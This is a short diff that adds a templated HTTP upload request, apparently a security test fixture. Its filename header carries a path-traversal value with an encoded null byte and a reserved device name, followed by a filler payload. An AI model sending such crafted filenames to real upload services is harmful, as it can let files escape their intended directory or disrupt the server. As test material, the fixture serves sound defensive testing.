@@ -1,0 +1,8 @@
+POST /v1/uploads HTTP/1.1
+Host: {{HOST}}
+Authorization: Bearer {{TOKEN}}
+Connection: close
+X-Capia-Filename: ..%2f..%2fCON%00.png
+Content-Length: {{CL}}
+
+PNG-ish payload AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
